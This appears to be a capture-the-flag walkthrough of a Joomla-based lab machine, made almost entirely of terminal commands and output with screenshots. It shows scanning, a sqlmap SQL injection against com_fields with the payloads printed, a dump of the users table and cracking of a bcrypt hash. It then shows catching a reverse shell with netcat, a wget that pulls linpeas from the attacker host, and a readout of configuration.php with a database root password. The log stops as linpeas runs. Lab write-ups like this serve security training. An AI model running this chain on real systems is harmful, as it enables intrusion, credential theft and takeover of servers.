```
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sV -sC -p- 10.113.133.67 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 22:27 EDT

Nmap scan report for 10.113.133.67
Host is up (0.24s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla! - Open Source Content Management
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1689.62 seconds
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u 10.113.133.67 -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,txt,js
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.133.67
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/.hta.php             (Status: 403) [Size: 210]
/.hta.txt             (Status: 403) [Size: 210]
/.htaccess.txt        (Status: 403) [Size: 215]
/.hta.js              (Status: 403) [Size: 209]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/.htpasswd.php        (Status: 403) [Size: 215]
/.htaccess.js         (Status: 403) [Size: 214]
/.htpasswd.txt        (Status: 403) [Size: 215]
/.htaccess.php        (Status: 403) [Size: 215]
/.htpasswd.js         (Status: 403) [Size: 214]
/administrator        (Status: 301) [Size: 243] [--> http://10.113.133.67/administrator/]
/bin                  (Status: 301) [Size: 233] [--> http://10.113.133.67/bin/]
/cache                (Status: 301) [Size: 235] [--> http://10.113.133.67/cache/]
/cgi-bin/             (Status: 403) [Size: 210]
/components           (Status: 301) [Size: 240] [--> http://10.113.133.67/components/]
/configuration.php    (Status: 200) [Size: 0]
/images               (Status: 301) [Size: 236] [--> http://10.113.133.67/images/]
/includes             (Status: 301) [Size: 238] [--> http://10.113.133.67/includes/]
/index.php            (Status: 200) [Size: 9280]
/index.php            (Status: 200) [Size: 9280]
/language             (Status: 301) [Size: 238] [--> http://10.113.133.67/language/]
/layouts              (Status: 301) [Size: 237] [--> http://10.113.133.67/layouts/]
/libraries            (Status: 301) [Size: 239] [--> http://10.113.133.67/libraries/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/media                (Status: 301) [Size: 235] [--> http://10.113.133.67/media/]
/modules              (Status: 301) [Size: 237] [--> http://10.113.133.67/modules/]
/plugins              (Status: 301) [Size: 237] [--> http://10.113.133.67/plugins/]
/README.txt           (Status: 200) [Size: 4494]
/robots.txt           (Status: 200) [Size: 836]
/robots.txt           (Status: 200) [Size: 836]
/templates            (Status: 301) [Size: 239] [--> http://10.113.133.67/templates/]
/tmp                  (Status: 301) [Size: 233] [--> http://10.113.133.67/tmp/]
/web.config.txt       (Status: 200) [Size: 1690]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

<img width="733" height="611" alt="Screenshot 2026-09-02 092940" src="https://github.com/user-attachments/assets/190938a9-f3d4-47da-9d2f-d4764dc85473" />

<img width="557" height="588" alt="Screenshot 2026-09-02 093149" src="https://github.com/user-attachments/assets/9a2b411b-0e57-4116-8707-ede8ad886ed0" />

<img width="953" height="475" alt="Screenshot 2026-09-02 093959" src="https://github.com/user-attachments/assets/8be9f6e9-cc34-4f21-9bb0-49d6ffc2159b" />

<img width="948" height="746" alt="Screenshot 2026-09-02 094043" src="https://github.com/user-attachments/assets/a2d2fd16-b674-46a9-94d6-e114be27faf2" />

<img width="942" height="707" alt="image" src="https://github.com/user-attachments/assets/2ed8e45d-8714-4902-a59f-aea2b3ccb6bd" />

<img width="897" height="707" alt="image" src="https://github.com/user-attachments/assets/a63aaf6d-9047-40b7-96e9-6251d1715a78" />

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://10.113.133.67/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 
```
```
[23:11:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: PHP 5.6.40, Apache 2.4.6
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[23:11:48] [INFO] fetching database names
[23:11:48] [INFO] retrieved: 'information_schema'
[23:11:49] [INFO] retrieved: 'joomla'
[23:11:49] [INFO] retrieved: 'mysql'
[23:11:49] [INFO] retrieved: 'performance_schema'
[23:11:50] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://10.113.133.67/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla --tables
```

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.8#stable}                                                                            
|_ -| . [)]     | .'| . |                                                                                           
|___|_  [.]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:15:20 /2026-09-01/

[23:15:20] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6) AppleWebKit/531.4 (KHTML, like Gecko) Version/4.0.3 Safari/531.4' from file '/usr/share/sqlmap/data/txt/user-agents.txt'    
[23:15:21] [INFO] resuming back-end DBMS 'mysql' 
[23:15:21] [INFO] testing connection to the target URL
[23:15:21] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=no0qnau5sg2...a3m6rbjd26'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7659 FROM(SELECT COUNT(*),CONCAT(0x71706b6b71,(SELECT (ELT(7659=7659,1))),0x717a7a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9244 FROM (SELECT(SLEEP(5)))lvNI)
---
[23:15:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[23:15:23] [INFO] fetching database names
[23:15:23] [INFO] resumed: 'information_schema'
[23:15:23] [INFO] resumed: 'joomla'
[23:15:23] [INFO] resumed: 'mysql'
[23:15:23] [INFO] resumed: 'performance_schema'
[23:15:23] [INFO] resumed: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[23:15:23] [INFO] fetching tables for database: 'joomla'
[23:15:24] [INFO] retrieved: '#__assets'
[23:15:24] [INFO] retrieved: '#__associations'
[23:15:25] [INFO] retrieved: '#__banner_clients'
[23:15:25] [INFO] retrieved: '#__banner_tracks'
[23:15:25] [INFO] retrieved: '#__banners'
[23:15:26] [INFO] retrieved: '#__categories'
[23:15:26] [INFO] retrieved: '#__contact_details'
[23:15:26] [INFO] retrieved: '#__content'
[23:15:27] [INFO] retrieved: '#__content_frontpage'
[23:15:27] [INFO] retrieved: '#__content_rating'
[23:15:27] [INFO] retrieved: '#__content_types'
[23:15:28] [INFO] retrieved: '#__contentitem_tag_map'
[23:15:28] [INFO] retrieved: '#__core_log_searches'
[23:15:28] [INFO] retrieved: '#__extensions'
[23:15:29] [INFO] retrieved: '#__fields'
[23:15:29] [INFO] retrieved: '#__fields_categories'
[23:15:29] [INFO] retrieved: '#__fields_groups'
[23:15:30] [INFO] retrieved: '#__fields_values'
[23:15:30] [INFO] retrieved: '#__finder_filters'
[23:15:30] [INFO] retrieved: '#__finder_links'
[23:15:31] [INFO] retrieved: '#__finder_links_terms0'
[23:15:31] [INFO] retrieved: '#__finder_links_terms1'
[23:15:31] [INFO] retrieved: '#__finder_links_terms2'
[23:15:31] [INFO] retrieved: '#__finder_links_terms3'
[23:15:32] [INFO] retrieved: '#__finder_links_terms4'
[23:15:32] [INFO] retrieved: '#__finder_links_terms5'
[23:15:32] [INFO] retrieved: '#__finder_links_terms6'
[23:15:33] [INFO] retrieved: '#__finder_links_terms7'
[23:15:33] [INFO] retrieved: '#__finder_links_terms8'
[23:15:33] [INFO] retrieved: '#__finder_links_terms9'
[23:15:34] [INFO] retrieved: '#__finder_links_termsa'
[23:15:34] [INFO] retrieved: '#__finder_links_termsb'
[23:15:34] [INFO] retrieved: '#__finder_links_termsc'
[23:15:35] [INFO] retrieved: '#__finder_links_termsd'
[23:15:35] [INFO] retrieved: '#__finder_links_termse'
[23:15:35] [INFO] retrieved: '#__finder_links_termsf'
[23:15:36] [INFO] retrieved: '#__finder_taxonomy'
[23:15:36] [INFO] retrieved: '#__finder_taxonomy_map'
[23:15:36] [INFO] retrieved: '#__finder_terms'
[23:15:37] [INFO] retrieved: '#__finder_terms_common'
[23:15:37] [INFO] retrieved: '#__finder_tokens'
[23:15:37] [INFO] retrieved: '#__finder_tokens_aggregate'
[23:15:38] [INFO] retrieved: '#__finder_types'
[23:15:38] [INFO] retrieved: '#__languages'
[23:15:38] [INFO] retrieved: '#__menu'
[23:15:39] [INFO] retrieved: '#__menu_types'
[23:15:39] [INFO] retrieved: '#__messages'
[23:15:39] [INFO] retrieved: '#__messages_cfg'
[23:15:39] [INFO] retrieved: '#__modules'
[23:15:40] [INFO] retrieved: '#__modules_menu'
[23:15:40] [INFO] retrieved: '#__newsfeeds'
[23:15:40] [INFO] retrieved: '#__overrider'
[23:15:41] [INFO] retrieved: '#__postinstall_messages'
[23:15:41] [INFO] retrieved: '#__redirect_links'
[23:15:41] [INFO] retrieved: '#__schemas'
[23:15:42] [INFO] retrieved: '#__session'
[23:15:42] [INFO] retrieved: '#__tags'
[23:15:42] [INFO] retrieved: '#__template_styles'
[23:15:43] [INFO] retrieved: '#__ucm_base'
[23:15:43] [INFO] retrieved: '#__ucm_content'
[23:15:43] [INFO] retrieved: '#__ucm_history'
[23:15:44] [INFO] retrieved: '#__update_sites'
[23:15:44] [INFO] retrieved: '#__update_sites_extensions'
[23:15:44] [INFO] retrieved: '#__updates'
[23:15:45] [INFO] retrieved: '#__user_keys'
[23:15:45] [INFO] retrieved: '#__user_notes'
[23:15:45] [INFO] retrieved: '#__user_profiles'
[23:15:46] [INFO] retrieved: '#__user_usergroup_map'
[23:15:46] [INFO] retrieved: '#__usergroups'
[23:15:46] [INFO] retrieved: '#__users'
[23:15:47] [INFO] retrieved: '#__utf8_conversion'
[23:15:47] [INFO] retrieved: '#__viewlevels'
Database: joomla
[72 tables]
+----------------------------+
| #__assets                  |
| #__associations            |
| #__banner_clients          |
| #__banner_tracks           |
| #__banners                 |
| #__categories              |
| #__contact_details         |
| #__content_frontpage       |
| #__content_rating          |
| #__content_types           |
| #__content                 |
| #__contentitem_tag_map     |
| #__core_log_searches       |
| #__extensions              |
| #__fields_categories       |
| #__fields_groups           |
| #__fields_values           |
| #__fields                  |
| #__finder_filters          |
| #__finder_links_terms0     |
| #__finder_links_terms1     |
| #__finder_links_terms2     |
| #__finder_links_terms3     |
| #__finder_links_terms4     |
| #__finder_links_terms5     |
| #__finder_links_terms6     |
| #__finder_links_terms7     |
| #__finder_links_terms8     |
| #__finder_links_terms9     |
| #__finder_links_termsa     |
| #__finder_links_termsb     |
| #__finder_links_termsc     |
| #__finder_links_termsd     |
| #__finder_links_termse     |
| #__finder_links_termsf     |
| #__finder_links            |
| #__finder_taxonomy_map     |
| #__finder_taxonomy         |
| #__finder_terms_common     |
| #__finder_terms            |
| #__finder_tokens_aggregate |
| #__finder_tokens           |
| #__finder_types            |
| #__languages               |
| #__menu_types              |
| #__menu                    |
| #__messages_cfg            |
| #__messages                |
| #__modules_menu            |
| #__modules                 |
| #__newsfeeds               |
| #__overrider               |
| #__postinstall_messages    |
| #__redirect_links          |
| #__schemas                 |
| #__session                 |
| #__tags                    |
| #__template_styles         |
| #__ucm_base                |
| #__ucm_content             |
| #__ucm_history             |
| #__update_sites_extensions |
| #__update_sites            |
| #__updates                 |
| #__user_keys               |
| #__user_notes              |
| #__user_profiles           |
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+

[23:15:47] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 74 times
[23:15:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.113.133.67'
[23:15:47] [WARNING] your sqlmap version is outdated

[*] ending @ 23:15:47 /2026-09-01/

```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://10.113.133.67/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" --column
```
```
       ___
       __H__                                                                                                        
 ___ ___[,]_____ ___ ___  {1.9.8#stable}                                                                            
|_ -| . [.]     | .'| . |                                                                                           
|___|_  [']_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:19:14 /2026-09-01/

[23:19:14] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'   
[23:19:14] [INFO] resuming back-end DBMS 'mysql' 
[23:19:14] [INFO] testing connection to the target URL
[23:19:15] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=60v4011ofgn...j7uv9gket2'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7659 FROM(SELECT COUNT(*),CONCAT(0x71706b6b71,(SELECT (ELT(7659=7659,1))),0x717a7a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9244 FROM (SELECT(SLEEP(5)))lvNI)
---
[23:19:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[23:19:16] [INFO] fetching database names
[23:19:16] [INFO] resumed: 'information_schema'
[23:19:16] [INFO] resumed: 'joomla'
[23:19:16] [INFO] resumed: 'mysql'
[23:19:16] [INFO] resumed: 'performance_schema'
[23:19:16] [INFO] resumed: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[23:19:16] [INFO] fetching columns for table '#__users' in database 'joomla'
[23:19:16] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
do you want to use common column existence check? [y/N/q] Y
[23:19:19] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 

[23:19:20] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
[23:19:20] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 100
[23:19:24] [CRITICAL] maximum number of used threads is 10 avoiding potential connection issues
please enter number of threads? [Enter for 1 (current)] 10
[23:19:28] [INFO] starting 10 threads
[23:19:28] [INFO] retrieved: id                                                                                    
[23:19:28] [INFO] retrieved: name                                                                                  
[23:19:28] [INFO] retrieved: username                                                                              
[23:19:33] [INFO] retrieved: email                                                                                 
[23:20:25] [INFO] retrieved: password
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://10.113.133.67/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" -C username,password --dump 
```
```
        ___
       __H__                                                                                                        
 ___ ___["]_____ ___ ___  {1.9.8#stable}                                                                            
|_ -| . [.]     | .'| . |                                                                                           
|___|_  [(]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:22:35 /2026-09-01/

[23:22:35] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[23:22:35] [INFO] resuming back-end DBMS 'mysql' 
[23:22:35] [INFO] testing connection to the target URL
[23:22:35] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=k5rhag77279...ko4gnhj6g7'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 7659 FROM(SELECT COUNT(*),CONCAT(0x71706b6b71,(SELECT (ELT(7659=7659,1))),0x717a7a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9244 FROM (SELECT(SLEEP(5)))lvNI)
---
[23:22:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: PHP 5.6.40, Apache 2.4.6
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[23:22:37] [INFO] fetching database names
[23:22:37] [INFO] resumed: 'information_schema'
[23:22:37] [INFO] resumed: 'joomla'
[23:22:37] [INFO] resumed: 'mysql'
[23:22:37] [INFO] resumed: 'performance_schema'
[23:22:37] [INFO] resumed: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[23:22:37] [INFO] fetching entries of column(s) 'password,username' for table '#__users' in database 'joomla'
[23:22:38] [INFO] retrieved: '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[23:22:38] [INFO] retrieved: 'jonah'
Database: joomla
Table: #__users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+----------+--------------------------------------------------------------+

[23:22:38] [INFO] table 'joomla.`#__users`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.113.133.67/dump/joomla/#__users.csv'                                                                                           
[23:22:38] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 4 times
[23:22:38] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.113.133.67'
[23:22:38] [WARNING] your sqlmap version is outdated

[*] ending @ 23:22:38 /2026-09-01/
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  jonah_password.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:05:57 DONE (2026-09-01 23:35) 0.002798g/s 131.0p/s 131.0c/s 131.0C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<img width="402" height="312" alt="image" src="https://github.com/user-attachments/assets/fdd66253-d1f5-471d-b8f6-3f47ba9ec614" />

<img width="945" height="726" alt="image" src="https://github.com/user-attachments/assets/dd7309f5-7f73-4a93-9eff-a3fa7706303c" />

<img width="1050" height="452" alt="image" src="https://github.com/user-attachments/assets/7dd5c8e8-923e-4005-bc16-0ddf765717b6" />

<img width="1050" height="256" alt="image" src="https://github.com/user-attachments/assets/a40d66f4-7278-4af5-99d2-c18620349342" />

<img width="1050" height="695" alt="Untitled" src="https://github.com/user-attachments/assets/c7c76bbf-ba09-40fa-93f5-45e1ef0ff4e5" />

```
┌──(kali㉿kali)-[~]
└─$ nc -vnlp 1234     
listening on [any] 1234 ...
connect to [192.168.134.53] from (UNKNOWN) [10.112.159.129] 33942
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 04:11:04 up 4 min,  0 users,  load average: 0.02, 0.08, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
```

```
sh-4.2$ whoami
whoami
apache
```
```
sh-4.2$ ls -al
ls -al
total 16
dr-xr-xr-x.  17 root root  244 Dec 14  2019 .
dr-xr-xr-x.  17 root root  244 Dec 14  2019 ..
-rw-r--r--    1 root root    0 Dec 14  2019 .autorelabel
lrwxrwxrwx.   1 root root    7 Dec 14  2019 bin -> usr/bin
dr-xr-xr-x.   5 root root 4096 Jan 14  2020 boot
drwxr-xr-x   19 root root 2980 Sep  2 04:06 dev
drwxr-xr-x.  79 root root 8192 Jan 14  2020 etc
drwxr-xr-x.   3 root root   22 Dec 14  2019 home
lrwxrwxrwx.   1 root root    7 Dec 14  2019 lib -> usr/lib
lrwxrwxrwx.   1 root root    9 Dec 14  2019 lib64 -> usr/lib64
drwxr-xr-x.   2 root root    6 Apr 11  2018 media
drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
drwxr-xr-x.   2 root root    6 Apr 11  2018 opt
dr-xr-xr-x  119 root root    0 Sep  2 04:06 proc
dr-xr-x---.   3 root root  163 Dec 15  2019 root
drwxr-xr-x   25 root root  700 Sep  2 04:07 run
lrwxrwxrwx.   1 root root    8 Dec 14  2019 sbin -> usr/sbin
drwxr-xr-x.   2 root root    6 Apr 11  2018 srv
dr-xr-xr-x   13 root root    0 Sep  2 04:06 sys
drwxrwxrwt    2 root root    6 Sep  2 04:07 tmp
drwxr-xr-x.  13 root root  155 Dec 14  2019 usr
drwxr-xr-x.  20 root root  278 Dec 14  2019 var
```
```
sh-4.2$ cd /home
cd /home
sh-4.2$ ls -al
ls -al
total 0
drwxr-xr-x.  3 root     root      22 Dec 14  2019 .
dr-xr-xr-x. 17 root     root     244 Dec 14  2019 ..
drwx------.  2 jjameson jjameson  99 Dec 15  2019 jjameson
```
```
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```
sh-4.2$ cd /tmp
cd /tmp
```
```
sh-4.2$ wget http://192.168.134.53:8000/linpeas.sh
wget http://192.168.134.53:8000/linpeas.sh
--2026-09-02 04:29:56--  http://192.168.134.53:8000/linpeas.sh
Connecting to 192.168.134.53:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 332111 (324K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... .......... 15% 80.9K 3s
    50K .......... .......... .......... .......... .......... 30%  211K 2s
   100K .......... .......... .......... .......... .......... 46% 2.50M 1s
   150K .......... .......... .......... .......... .......... 61%  198K 1s
   200K .......... .......... .......... .......... .......... 77% 91.6K 0s
   250K .......... .......... .......... .......... .......... 92% 42.2K 0s
   300K .......... .......... ....                            100%  382M=2.9s

2026-09-02 04:30:00 (113 KB/s) - 'linpeas.sh' saved [332111/332111]
```
```
sh-4.2$ ls -al
ls -al
total 328
drwxrwxrwt   2 root   root       24 Sep  2 04:29 .
dr-xr-xr-x. 17 root   root      244 Dec 14  2019 ..
-rw-rw-rw-   1 apache apache 332111 Sep  2 04:22 linpeas.sh
```
```
sh-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
```

```
sh-4.2$ cd /var/www/html     
cd /var/www/html
sh-4.2$ ls -al
ls -al
total 64
drwxr-xr-x. 17 apache apache  4096 Dec 14  2019 .
drwxr-xr-x.  4 root   root      33 Dec 14  2019 ..
-rwxr-xr-x.  1 apache apache 18092 Apr 25  2017 LICENSE.txt
-rwxr-xr-x.  1 apache apache  4494 Apr 25  2017 README.txt
drwxr-xr-x. 11 apache apache   159 Apr 25  2017 administrator
drwxr-xr-x.  2 apache apache    44 Apr 25  2017 bin
drwxr-xr-x.  2 apache apache    24 Apr 25  2017 cache
drwxr-xr-x.  2 apache apache   119 Apr 25  2017 cli
drwxr-xr-x. 19 apache apache  4096 Apr 25  2017 components
-rw-r--r--   1 apache apache  1982 Dec 14  2019 configuration.php
-rwxr-xr-x.  1 apache apache  3005 Apr 25  2017 htaccess.txt
drwxr-xr-x.  5 apache apache   164 Dec 15  2019 images
drwxr-xr-x.  2 apache apache    64 Apr 25  2017 includes
-rwxr-xr-x.  1 apache apache  1420 Apr 25  2017 index.php
drwxr-xr-x.  4 apache apache    54 Apr 25  2017 language
drwxr-xr-x.  5 apache apache    70 Apr 25  2017 layouts
drwxr-xr-x. 11 apache apache   255 Apr 25  2017 libraries
drwxr-xr-x. 26 apache apache  4096 Apr 25  2017 media
drwxr-xr-x. 27 apache apache  4096 Apr 25  2017 modules
drwxr-xr-x. 16 apache apache   250 Apr 25  2017 plugins
-rwxr-xr-x.  1 apache apache   836 Apr 25  2017 robots.txt
drwxr-xr-x.  5 apache apache    68 Dec 15  2019 templates
drwxr-xr-x.  2 apache apache    24 Dec 15  2019 tmp
-rwxr-xr-x.  1 apache apache  1690 Apr 25  2017 web.config.txt
```
```
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
```
```
sh-4.2$ ./linpeas.sh
./linpeas.sh
```

